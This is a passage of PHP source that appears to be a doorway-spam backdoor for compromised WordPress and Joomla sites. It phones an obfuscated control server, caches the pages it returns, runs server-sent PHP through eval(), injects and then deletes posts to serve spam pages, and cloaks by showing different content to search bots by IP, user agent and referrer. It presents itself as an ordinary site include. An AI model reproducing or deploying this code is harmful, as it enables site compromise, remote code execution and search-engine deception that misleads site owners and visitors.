			$geturl = "http://" . $servurl . "?clientid=" . urlencode($clientid) . "&clienturl=" . urlencode($clienturl) . "&itsinclude=" . urlencode($itsinclude) . "&clienttype=" . urlencode($clienttype) . "&lang=" . urlencode($lang) . "&currkey=" . urlencode($q) . "&wherecontent=" . urlencode($wherecontent) . "&textfilename=" . urlencode($textfilename) . "&keyfilename=" . urlencode($keyfilename) . "&themesfilename=" . $themesfilename . "&templatename=" . $templatename . "&extlinksfilename=" . $extlinksfilename . "&keysfilestatus=" . urlencode($keysfilestatus) . "&workstatus=" . urlencode($workstatus) . "&clientdomain=" . urlencode($thisdomain) . "&clienterrors=" . urlencode($errors);
			$page = getpagefmurl($geturl);
			if (stripos("qqqq" . $page, "CurlError")) {
				$errorsforlocal .= $page . " while get content from server\t";
			} else {
				if (!empty($page)) {
					$fod = fopen($cachefilename, "a+");
					flock($fod, LOCK_EX);
					fwrite($fod, $urlhash . "::::" . codedata($page) . "\n");
					fclose($fod);
				}
			}
		}
	}
	if ($q == "this-is-the-test-of-door") {
		$page = "DOORWAYISWORKTITLE
	====================
DOORWAYISWORK
====================
DOORWAYISWORKCONTENT";
	}
	if (!empty($page) && !empty($clienttype)) {
		if ($q != "this-is-the-test-of-door") {
			$clienttype = trim($clienttype);
			if (stripos("qqq" . $redirect, "THISISPHPREDIRECT")) {
				$redirect = str_ireplace("THISISPHPREDIRECT", "", $redirect);
				$redirect = str_ireplace("<?php", "", $redirect);
				$redirect = str_ireplace("?>", "", $redirect);
				$redirect = str_ireplace("[DEFISKEY]", str_ireplace(" ", "-", $q), $redirect);
				eval($redirect);
				$redirect = "";
			}
		}
		$redirect = str_ireplace("[CURREFERER]", urlencode($referer), $redirect);
		$redirect = str_ireplace("[DOORURL]", urlencode($_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']), $redirect);
		if ($clienttype == "simple") {
			$page = str_ireplace("[REDIRECT]", $redirect, $page);
			$page = str_ireplace("[DEFISKEY]", str_ireplace(" ", "-", $q), $page);
			echo $page;
			die();
		}
		if ($clienttype == "wpfunc") {
			$page = str_ireplace("[REDIRECT]", $redirect, $page);
			$page = str_ireplace("[DEFISKEY]", str_ireplace(" ", "-", $q), $page);
			$page = explode("====================", $page);
			if (count($page) >= 3) {
				if (!is_function_enabled('query_posts') && !is_function_enabled('add_filter') && !is_function_enabled('add_action')) {
					$errors .= "Not WP or include before WP functions loaded\t";
					$errorsforlocal .= "Not WP or include before WP functions loaded\t";
				} else {
					$title = trim($page[0]);
					$body = trim($page[2]);
					$desc = trim($page[1]);
					query_posts('posts_per_page=1');
					add_filter('the_content', 'getbody');
					add_filter('wp_title', 'gettitle');
					add_filter('the_title', 'gettitle');
					add_action('wp_head', 'getdesc');
				}
			} else {
				$errors .= "Bad template for WP, check it\t";
				$errorsforlocal .= "Bad template for WP, check it\t";
			}
		}
		if ($clienttype == "wpnew") {
			if (!is_function_enabled('wp_insert_post') && !is_function_enabled('get_permalink') && !is_function_enabled('wp_delete_post') && !is_function_enabled('add_action')) {
				$errors .= "Not WP or include before WP functions loaded\t";
				$errorsforlocal .= "Not WP or include before WP functions loaded\t";
			} else {
				$page = str_ireplace("[DEFISKEY]", str_ireplace(" ", "-", $q), $page);
				if (!empty($redirect)) {
					$redirect = str_ireplace("[DEFISKEY]", str_ireplace(" ", "-", $q), $redirect);
				}
				$page = explode("====================", $page);
				if (count($page) >= 3) {
					$slugname = randString(8);
					$post_data = array('post_title' => trim($page[0]), 'post_name' => $slugname, 'post_content' => trim($page[2]), 'post_status' => 'publish', 'post_category' => array());
					$post_id = wp_insert_post($post_data, true);
					$permalink = get_permalink($post_id);
					$testpermalink = explode("/", $permalink);
					if (stripos($testpermalink[count($testpermalink) - 1], "?")) {
						$goodwordpresspage = file_get_contents($permalink . "&ineedthispage=yes");
					} else {
						$goodwordpresspage = file_get_contents($permalink . "?ineedthispage=yes");
					}
					$goodwordpresspage = str_ireplace($permalink, "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'], $goodwordpresspage);
					$goodwordpresspage = str_ireplace("&ineedthispage=yes", "", $goodwordpresspage);
					$goodwordpresspage = str_ireplace("&amp;ineedthispage=yes", "", $goodwordpresspage);
					if (!wp_delete_post($post_id, true)) {
						wp_delete_post($post_id, true);
					}
					$goodwordpresspage = str_ireplace("[REDIRECT]", $redirect, $goodwordpresspage);
					echo $goodwordpresspage;
					die();
				}
			}
		}
		if ($clienttype == "wpgood" || $clienttype == "joomlagood") {
			if (file_exists($nativetemplatefilename)) {
				$nativetemplate = file_get_contents($nativetemplatefilename);
				$nativetemplate = decodedata(urldecode($nativetemplate));
				if (!empty($redirect)) {
					$redirect = str_ireplace("[DEFISKEY]", str_ireplace(" ", "-", $q), $redirect);
				}
				$page = str_ireplace("[REDIRECT]", $redirect, $page);
				$page = str_ireplace("[DEFISKEY]", str_ireplace(" ", "-", $q), $page);
				$page = explode("====================", $page);
				if (count($page) >= 3) {
					$nativetemplate = preg_replace("/<title>(.*)<\/title>/iUm", "<title>" . trim($page[0]) . "</title>", $nativetemplate);
					$nativetemplate = preg_replace("/<link rel=[\"\']{1}canonical[\"\']{1} href=[\"\']{1}.*[\"\']{1}/iUs", "<link rel='canonical' href='http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "'", $nativetemplate);
					$nativetemplate = preg_replace("/<link rel=[\"\']{1}shortlink[\"\']{1} href=[\"\']{1}.*[\"\']{1}/iUs", "<link rel='shortlink' href='http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "'", $nativetemplate);
					$nativetemplate = str_ireplace("HEREISTITLE", trim($page[0]), $nativetemplate);
					$nativetemplate = str_ireplace("</head>", "<META NAME=\"description\" CONTENT=\"" . trim($page[1]) . "\"/>\n</head>", $nativetemplate);
					$nativetemplate = str_ireplace("HEREISCONTENT", $page[2], $nativetemplate);
					echo $nativetemplate;
					die();
				}
			}
		}
		if ($clienttype == "joomla") {
			if (!is_function_enabled('postItem') && !class_exists("JFactory")) {
				$errors .= "Not Joomla, bad version of Joomla or include before Joomla functions loaded\t";
				$errorsforlocal .= "Not Joomla, bad version of Joomla or include before Joomla functions loaded\t";
			} else {
				$page = str_ireplace("[REDIRECT]", "", $page);
				$page = str_ireplace("[DEFISKEY]", str_ireplace(" ", "-", $q), $page);
				if (!empty($redirect)) {
					$redirect = str_ireplace("[DEFISKEY]", str_ireplace(" ", "-", $q), $redirect);
				}
				$page = explode("====================", $page);
				if (count($page) >= 3) {
					$joomlaurl = explode("/", $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']);
					unset($joomlaurl[count($joomlaurl) - 1]);
					$idtemp = postItem(trim($page[0]), trim($page[1]), trim($page[2]));
					$idtemp = explode(":", $idtemp);
					$titletemp = trim($page[0]);
					if (is_array($idtemp)) {
						$alias = trim($idtemp[1]);
						$id = trim($idtemp[0]);
						$page = file_get_contents("http://" . trim(implode("/", $joomlaurl), "/") . "/index.php/?option=com_content&view=article&id=" . $id . "&ineedthispage=yes");
						$page = str_ireplace("&ineedthispage=yes", "", $page);
						$page = str_ireplace("&amp;ineedthispage=yes", "", $page);
						$page = str_ireplace("?ineedthispage=yes", "", $page);
						$page = preg_replace("/<title>(.*)<\/title>/iUm", "<title>" . $titletemp . "</title>", $page);
						$db = JFactory::getDbo();
						$query = $db->getQuery(true);
						$query->delete($db->quoteName('#__content'))->where(array($db->quoteName('id') . '=' . $id));
						$db->setQuery($query);
						$result = $db->query();
						echo $redirect . "" . $page;
						die();
					}
				}
			}
		}
		if ($clienttype == "doctype") {
			$doctemplate = "%09%09%09+%3Chtml+xmlns%3Av%3D%22urn%3Aschemas-microsoft-com%3Avml%22%0A%09%09%09xmlns%3Ao%3D%22urn%3Aschemas-microsoft-com%3Aoffice%3Aoffice%22%0A%09%09%09xmlns%3Aw%3D%22urn%3Aschemas-microsoft-com%3Aoffice%3Aword%22%0A%09%09%09xmlns%3D%22http%3A%2F%2Fwww.w3.org%2FTR%2FREC-html40%22%3E%0A%09%09%09%0A%09%09%09%3Chead%3E%0A%09%09%09%3Cmeta+http-equiv%3DContent-Type+content%3D%22text%2Fhtml%3B+charset%3Dutf-8%22%3E%0A%09%09%09%3Cmeta+name%3DProgId+content%3DWord.Document%3E%0A%09%09%09%3Cmeta+name%3DGenerator+content%3D%22Microsoft+Word+9%22%3E%0A%09%09%09%3Cmeta+name%3DOriginator+content%3D%22Microsoft+Word+9%22%3E%0A%09%09%09%3C%21--%5Bif+%21mso%5D%3E%0A%09%09%09%3Cstyle%3E%0A%09%09%09v%5C%3A%2A+%7Bbehavior%3Aurl%28%23default%23VML%29%3B%7D%0A%09%09%09o%5C%3A%2A+%7Bbehavior%3Aurl%28%23default%23VML%29%3B%7D%0A%09%09%09w%5C%3A%2A+%7Bbehavior%3Aurl%28%23default%23VML%29%3B%7D%0A%09%09%09.shape+%7Bbehavior%3Aurl%28%23default%23VML%29%3B%7D%0A%09%09%09%3C%2Fstyle%3E%0A%09%09%09%3C%21%5Bendif%5D--%3E%0A%09%09%09%3Ctitle%3E%5BHEREAREDOCTITLE%5D%3C%2Ftitle%3E%0A%09%09%09%3C%21--%5Bif+gte+mso+9%5D%3E%3Cxml%3E%0A%09%09%09+%3Cw%3AWordDocument%3E%0A%09%09%09++%3Cw%3AView%3EPrint%3C%2Fw%3AView%3E%0A%09%09%09++%3Cw%3ADoNotHyphenateCaps%2F%3E%0A%09%09%09++%3Cw%3APunctuationKerning%2F%3E%0A%09%09%09++%3Cw%3ADrawingGridHorizontalSpacing%3E9.35+pt%3C%2Fw%3ADrawingGridHorizontalSpacing%3E%0A%09%09%09++%3Cw%3ADrawingGridVerticalSpacing%3E9.35+pt%3C%2Fw%3ADrawingGridVerticalSpacing%3E%0A%09%09%09+%3C%2Fw%3AWordDocument%3E%0A%09%09%09%3C%2Fxml%3E%3C%21%5Bendif%5D--%3E%0A%09%09%09%3Cstyle%3E%0A%09%09%09%3C%21--%0A%09%09%09+%2F%2A+Font+Definitions+%2A%2F%0A%09%09%09%40font-face%0A%09%09%09%09%7Bfont-family%3AVerdana%3B%0A%09%09%09%09panose-1%3A2+11+6+4+3+5+4+4+2+4%3B%0A%09%09%09%09mso-font-charset%3A0%3B%0A%09%09%09%09mso-generic-font-family%3Aswiss%3B%0A%09%09%09%09mso-font-pitch%3Avariable%3B%0A%09%09%09%09mso-font-signature%3A536871559+0+0+0+415+0%3B%7D%0A%09%09%09+%2F%2A+Style+Definitions+%2A%2F%0A%09%09%09p.MsoNormal%2C+li.MsoNormal%2C+div.MsoNormal%0A%09%09%09%09%7Bmso-style-parent%3A%22%22%3B%0A%09%09%09%09margin%3A0in%3B%0A%09%09%09%09margin-bottom%3A.0001pt%3B%0A%09%09%09%09mso-pagination%3Awidow-orphan%3B%0A%09%09%09%09font-size%3A7.5pt%3B%0A%09%09%09++++++++mso-bidi-font-size%3A8.0pt%3B%0A%09%09%09%09font-family%3A%22Verdana%22%3B%0A%09%09%09%09mso-fareast-font-family%3A%22Verdana%22%3B%7D%0A%09%09%09p.small%0A%09%09%09%09%7Bmso-style-parent%3A%22%22%3B%0A%09%09%09%09margin%3A0in%3B%0A%09%09%09%09margin-bottom%3A.0001pt%3B%0A%09%09%09%09mso-pagination%3Awidow-orphan%3B%0A%09%09%09%09font-size%3A1.0pt%3B%0A%09%09%09++++++++mso-bidi-font-size%3A1.0pt%3B%0A%09%09%09%09font-family%3A%22Verdana%22%3B%0A%09%09%09%09mso-fareast-font-family%3A%22Verdana%22%3B%7D%0A%09%09%09%40page+Section1%0A%09%09%09%09%7Bsize%3A8.5in+11.0in%3B%0A%09%09%09%09margin%3A1.0in+1.25in+1.0in+1.25in%3B%0A%09%09%09%09mso-header-margin%3A.5in%3B%0A%09%09%09%09mso-footer-margin%3A.5in%3B%0A%09%09%09%09mso-paper-source%3A0%3B%7D%0A%09%09%09div.Section1%0A%09%09%09%09%7Bpage%3ASection1%3B%7D%0A%09%09%09--%3E%0A%09%09%09%3C%2Fstyle%3E%0A%09%09%09%3C%21--%5Bif+gte+mso+9%5D%3E%3Cxml%3E%0A%09%09%09+%3Co%3Ashapedefaults+v%3Aext%3D%22edit%22+spidmax%3D%221032%22%3E%0A%09%09%09++%3Co%3Acolormenu+v%3Aext%3D%22edit%22+strokecolor%3D%22none%22%2F%3E%0A%09%09%09+%3C%2Fo%3Ashapedefaults%3E%3C%2Fxml%3E%3C%21%5Bendif%5D--%3E%3C%21--%5Bif+gte+mso+9%5D%3E%3Cxml%3E%0A%09%09%09+%3Co%3Ashapelayout+v%3Aext%3D%22edit%22%3E%0A%09%09%09++%3Co%3Aidmap+v%3Aext%3D%22edit%22+data%3D%221%22%2F%3E%0A%09%09%09+%3C%2Fo%3Ashapelayout%3E%3C%2Fxml%3E%3C%21%5Bendif%5D--%3E%0A%09%09%09++%0A%09%09%09%09%09%09%09%09%09%09%09%0A%09%09%09%09%09%09%09%09%09%09%09%3Cmeta+name%3D%27description%27+content%3D%27%5BHEREAREDOCDESC%5D%27%3E%0A%09%09%09%09%09%09%09%09%09%09%09%3Cmeta+name%3D%27keywords%27+content%3D%27%5BHEREAREDOCTITLE%5D%27%3E%0A%09%09%09%09%09%09%09%09+++++%0A%09%09%09%3C%2Fhead%3E%0A%09%09%09%3Cbody%3E%0A%09%09%09%09%09%09%09%09%5BHEREAREDOCCONTENT%5D%0A%09%09%09%09%09%09%09%09%3C%2Fbody%3E%3C%2Fhtml%3E";
			$page = str_ireplace("[REDIRECT]", "", $page);
			$page = str_ireplace("[DEFISKEY]", str_ireplace(" ", "-", $q), $page);
			if (!empty($redirect)) {
				$redirect = str_ireplace("[DEFISKEY]", str_ireplace(" ", "-", $q), $redirect);
			}
			$page = explode("====================", $page);
			if (count($page) >= 3) {
				$doctemplate = urldecode($doctemplate);
				$doctemplate = str_ireplace("[HEREAREDOCTITLE]", trim($page[0]), $doctemplate);
				$doctemplate = str_ireplace("[HEREAREDOCDESC]", trim($page[1]), $doctemplate);
				$doctemplate = str_ireplace("[HEREAREDOCCONTENT]", trim($page[2]), $doctemplate);
				if (!empty($redirect) && $q != "this-is-the-test-of-door") {
					echo $redirect;
					die();
				} else {
					if ($q != "this-is-the-test-of-door") {
						header('Cache-Control: public');
						header('Content-type: application/doc');
					}
					echo $doctemplate;
					die();
				}
			}
		}
		if ($clienttype == "pdftype") {
			if (!empty($redirect) && $q != "this-is-the-test-of-door") {
				$redirect = str_ireplace("[DEFISKEY]", str_ireplace(" ", "-", $q), $redirect);
				echo $redirect;
				die();
			} else {
				if ($q != "this-is-the-test-of-door") {
					header('Cache-Control: public');
					header('Content-type: application/pdf');
				}
				echo $page;
				die();
			}
		}
	}
	if (!empty($_GET['ineederrors']) && $_GET['ineederrors'] == "yes") {
		if (!empty($errorsforlocal)) {
			echo "<b>Current errors</b>: " . $errorsforlocal . "<br><br>";
			if (file_exists($errorsfilename)) {
				echo "<b>Errors history:</b> " . file_get_contents($errorsfilename);
			}
			die();
		} else {
			echo "No errors";
		}
	}
}
function getbody($body) {
	global $body;
	return $body;
}

function gettitle($title) {
	global $title;
	return $title;
}

function getdesc($desc) {
	global $desc;
	echo "<meta type=\"description\" content=\"" . $desc . "\">";
}

function randString($length) {
	$str = "";
	$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	$size = strlen($chars);
	for ($i = 0; $i < $length; $i++) {
		$str .= $chars[rand(0, $size - 1)];
	}
	return $str;
}

function getsettings($settfile, $needsetting, $fileorcontent) {
	if (empty($fileorcontent)) {
		if (file_exists($settfile)) {
			$settings = file_get_contents($settfile);
		} else {
			return "";
		}
	} else {
		$settings = $settfile;
	}
	$settings = urlencode($settings);
	$settings = trim($settings, "%0A");
	$settings .= "%0A";
	if ($needsetting == "clienturl") {
		preg_match("/clienturl%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$clienturl = $matches[1];
			$clienturl = trim($clienturl);
			return $clienturl;
		} else {
			return "";
		}
	}
	if ($needsetting == "clearcache") {
		preg_match("/clearcache%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$clearcache = $matches[1];
			$clearcache = trim($clearcache);
			return $clearcache;
		} else {
			return "";
		}
	}
	if ($needsetting == "newkeys") {
		preg_match("/newkeys%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$newkeys = $matches[1];
			$newkeys = trim($newkeys);
			return $newkeys;
		} else {
			return "";
		}
	}
	if ($needsetting == "getautosettsornot") {
		preg_match("/getautosettsornot%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$getautosettsornot = $matches[1];
			$getautosettsornot = trim($getautosettsornot);
			return $getautosettsornot;
		} else {
			return "";
		}
	}
	if ($needsetting == "cleanrescode") {
		preg_match("/cleanrescode%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$cleanrescode = $matches[1];
			$cleanrescode = trim($cleanrescode);
			return $cleanrescode;
		} else {
			return "";
		}
	}
	if ($needsetting == "dotemplate") {
		preg_match("/dotemplate%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$dotemplate = $matches[1];
			$dotemplate = trim($dotemplate);
			return $dotemplate;
		} else {
			return "";
		}
	}
	if ($needsetting == "newuseragents") {
		preg_match("/newuseragents%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$newuseragents = $matches[1];
			$newuseragents = trim($newuseragents);
			return $newuseragents;
		} else {
			return "";
		}
	}
	if ($needsetting == "newbotips") {
		preg_match("/newbotips%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$newbotips = $matches[1];
			$newbotips = trim($newbotips);
			return $newbotips;
		} else {
			return "";
		}
	}
	if ($needsetting == "newreffs") {
		preg_match("/newreffs%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$newreffs = $matches[1];
			$newreffs = trim($newreffs);
			return $newreffs;
		} else {
			return "";
		}
	}
	if ($needsetting == "usecloack") {
		preg_match("/usecloack%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$usecloack = $matches[1];
			$usecloack = trim($usecloack);
			return $usecloack;
		} else {
			return "";
		}
	}
	if ($needsetting == "itsinclude") {
		preg_match("/itsinclude%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$itsinclude = $matches[1];
			$itsinclude = trim($itsinclude);
			return $itsinclude;
		} else {
			return "";
		}
	}
	if ($needsetting == "clienttype") {
		preg_match("/clienttype%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$clienttype = $matches[1];
			$clienttype = trim($clienttype);
			return $clienttype;
		} else {
			return "";
		}
	}
	if ($needsetting == "lang") {
		preg_match("/lang%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$lang = $matches[1];
			$lang = trim($lang);
			return $lang;
		} else {
			return "";
		}
	}
	if ($needsetting == "wherecontent") {
		preg_match("/wherecontent%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$wherecontent = $matches[1];
			$wherecontent = trim($wherecontent);
			return $wherecontent;
		} else {
			return "";
		}
	}
	if ($needsetting == "textfilename") {
		preg_match("/textfilename%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$textfilename = $matches[1];
			$textfilename = trim($textfilename);
			return $textfilename;
		} else {
			return "";
		}
	}
	if ($needsetting == "keyfilename") {
		preg_match("/keyfilename%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$keyfilename = $matches[1];
			$keyfilename = trim($keyfilename);
			return $keyfilename;
		} else {
			return "";
		}
	}
	if ($needsetting == "themesfilename") {
		preg_match("/themesfilename%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$themesfilename = $matches[1];
			$themesfilename = trim($themesfilename);
			return $themesfilename;
		} else {
			return "";
		}
	}
	if ($needsetting == "templatename") {
		preg_match("/templatename%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$templatename = $matches[1];
			$templatename = trim($templatename);
			return $templatename;
		} else {
			return "";
		}
	}
	if ($needsetting == "extlinksfilename") {
		preg_match("/extlinksfilename%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$extlinksfilename = $matches[1];
			$extlinksfilename = trim($extlinksfilename);
			return $extlinksfilename;
		} else {
			return "";
		}
	}
	if ($needsetting == "renewclient") {
		preg_match("/renewclient%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$renewclient = $matches[1];
			$renewclient = trim($renewclient);
			return $renewclient;
		} else {
			return "";
		}
	}
	if ($needsetting == "keyperem") {
		preg_match("/keyperem%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$keyperem = $matches[1];
			$keyperem = trim($keyperem);
			return $keyperem;
		} else {
			return "";
		}
	}
	if ($needsetting == "redirect") {
		preg_match("/redirect%3D(.*)ENDOFREDIRECT%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$redirect = $matches[1];
			$redirect = trim($redirect);
			return $redirect;
		} else {
			return "";
		}
	}
	return "";
}

function is_function_enabled($func) {
	$func = strtolower(trim($func));
	if ($func == '')
		return false;
	$disabled = explode(",", @ini_get("disable_functions"));
	if (empty($disabled)) {
		$disabled = array();
	} else {
		$disabled = array_map('trim', array_map('strtolower', $disabled));
	}
	return (function_exists($func) && is_callable($func) && !in_array($func, $disabled));
}

function checktime($timetocurl) {
	global $cachedirname;
	global $clientid;
	if (is_dir($cachedirname)) {
		if (!file_exists($cachedirname . DIRECTORY_SEPARATOR . substr($clientid, 0, 7))) {
			$fod = fopen($cachedirname . DIRECTORY_SEPARATOR . substr($clientid, 0, 7), "w+");
			if (!empty($fod)) {
				flock($fod, LOCK_EX);
				fwrite($fod, "");
				fclose($fod);
			} else {
				return "errorcreate";
			}
		}
		$cron_time = filemtime($cachedirname . DIRECTORY_SEPARATOR . substr($clientid, 0, 7));
		if (time() - $cron_time >= $timetocurl) {
			@unlink($cachedirname . DIRECTORY_SEPARATOR . substr($clientid, 0, 7));
			$fod = fopen($cachedirname . DIRECTORY_SEPARATOR . substr($clientid, 0, 7), "w+");
			if (!empty($fod)) {
				flock($fod, LOCK_EX);
				fwrite($fod, "");
				fclose($fod);
				return "goodtime";
			} else {
				return "errorcreate";
			}
		}
		return false;
	} else {
		return false;
	}
}

function decodeservurl($servurl) {
	$goodservurl = array();
	foreach (str_split($servurl) as $onechar) {
		if (is_numeric($onechar)) {
			if ($onechar >= 7) {
				$onechar = $onechar - 7;
			} else {
				$onechar = $onechar + 10 - 7;
			}
		}
		$goodservurl[] = $onechar;
	}
	return urldecode(base64_decode(implode($goodservurl)));
}

function getpagefmurl($pageurl) {
	$pageurl = trim($pageurl);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $pageurl);
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_REFERER, "");
	$content = curl_exec($ch);
	$curlerror = curl_error($ch);
	if (!empty($curlerror)) {
		curl_close($ch);
		return "CurlError_" . str_ireplace(" ", "_", $curlerror);
	}
	curl_close($ch);
	return $content;
}

function cloack($ip) {
	global $referer;
	global $useragent;
	global $useragentsfilename;
	global $botipsfilename;
	global $referersfilename;
	$angrybot = "";
	if (file_exists($useragentsfilename)) {
		$useragents = decodedata(file_get_contents($useragentsfilename));
		$useragents = trim($useragents);
		$useragents = explode("\n", $useragents);
	}
	if (file_exists($referersfilename)) {
		$goodrefs = decodedata(file_get_contents($referersfilename));
		$goodrefs = trim($goodrefs);
		$goodrefs = explode("\n", $goodrefs);
	}
	$nowref = strtolower($referer);
	$nowref = trim($nowref);
	$nowua = strtolower($useragent);
	$nowua = trim($nowua);
	$ip = trim($ip);
	if (file_exists($botipsfilename) && !empty($ip)) {
		$ipforcloack = explode(".", $ip);
		$handle = fopen($botipsfilename, "r");
		$i = 1;
		while (!feof($handle)) {
			$cloackip = trim(fgets($handle));
			if (!empty($cloackip)) {
				$cloackip = explode(".", $cloackip);
				$needcloackip = explode("/", $cloackip[3]);
				if (!empty($needcloackip[1])) {
					if ($ipforcloack[0] == $cloackip[0] && $ipforcloack[1] == $cloackip[1] && $ipforcloack[2] == $cloackip[2] && $ipforcloack[3] >= $needcloackip[0] && $ipforcloack[3] <= $needcloackip[1]) {
						$angrybot = "1";
						break;
					}
				} else {
					if ($ip == implode(".", $cloackip)) {
						$angrybot = "1";
						break;
					}
					if (@preg_match('#^' . implode(".", $cloackip) . '$#', $ip)) {
						$angrybot = "1";
						break;
					}
				}
				$i++;
			}
		}
		fclose($handle);
	}
	if (empty($angrybot)) {
		if (!empty($useragents[0])) {
			foreach ($useragents as $cloackuseragent) {
				$cloackuseragent = strtolower($cloackuseragent);
				$cloackuseragent = trim($cloackuseragent);
				if (strpos("qqqq " . $nowua, $cloackuseragent) && !empty($cloackuseragent)) {
					$angrybot = "1";
					break;
				}
			}
		}
		if (empty($angrybot)) {
			if (!empty($goodrefs)) {
				foreach ($goodrefs as $goodref) {
					if (!empty($goodref)) {
						$goodref = strtolower($goodref);
						$goodref = trim($goodref);
						if (strpos("qqqq " . $nowref, $goodref)) {
							$angrybot = "";
							break;
						} else {
							$angrybot = "1";
						}
					} else {
						break;
					}
				}
			}
		}
	}
	return $angrybot;
}

function codedata($data) {
	$data = gzcompress(base64_encode(urlencode($data)), 7);
	return urlencode($data);
}

function codeservurl($servurl) {
	if (mb_detect_encoding($servurl) == "UTF-8") {
		$servurl = trim($servurl);
	} else {
		$servurl = iconv(mb_detect_encoding($servurl), "UTF-8", $servurl);
		$servurl = trim($servurl);
	}
	$goodservurl = array();
	foreach (str_split(base64_encode(urlencode($servurl))) as $onechar) {
		if (is_numeric($onechar)) {
			$onechar = $onechar + 7;
			if ($onechar > 9) {
				$onechar = $onechar - 10;
			}
		}
		$goodservurl[] = $onechar;
	}
	return implode($goodservurl);
}

function decodedata($data) {
	return urldecode(base64_decode(gzuncompress(urldecode($data))));
}

function keyindoorway($currentkey, $keyfilename) {
	$foundkey = "";
	$currentkey = trim(urldecode($currentkey));
	$currentkey = str_ireplace("-", " ", $currentkey);
	$currentkey = str_ireplace("  ", " ", $currentkey);
	$currentkey = strtolower($currentkey);
	$allkeys = decodedata(file_get_contents($keyfilename));
	$allkeys = explode("\n", $allkeys);
	foreach ($allkeys as $keyfrcheck) {
		$keyfrcheck = trim($keyfrcheck);
		$keyfrcheck = str_ireplace("-", " ", $keyfrcheck);
		$keyfrcheck = str_ireplace("  ", " ", $keyfrcheck);
		$keyfrcheck = strtolower($keyfrcheck);
		if ($keyfrcheck == $currentkey) {
			$foundkey = "yes";
			break;
		}
	}
	return $foundkey;
}

function postItem($title, $desc, $text) {
	$database = JFactory::getDBO();
	$item = new stdClass;
	$item->id = null;
	$item->title = $title;
	$item->introtext = $desc;
	$item->fulltext = $text;
	$item->state = 1;
	$item->access = 1;
	$item->created_by = 62;
	$item->created = date('Y-m-d H:i:s');
	$item->alias = JFilterOutput::stringURLSafe($item->title);
	if (!$database->insertObject('#__content', $item, 'id')) {
		echo $database->stderr();
		return false;
	}
	return $item->id . ":" . $item->alias;
}

function full_del_dir($directory) {
	$dir = opendir($directory);
	while (($file = readdir($dir))) {
		if (is_file($directory . DIRECTORY_SEPARATOR . $file)) {
			unlink($directory . DIRECTORY_SEPARATOR . $file);
		} else if (is_dir($directory . DIRECTORY_SEPARATOR . $file) && ($file != ".") && ($file != "..")) {
			full_del_dir($directory . DIRECTORY_SEPARATOR . $file);
		}
	}
	closedir($dir);
	rmdir($directory);
}

;
//item->alias
?>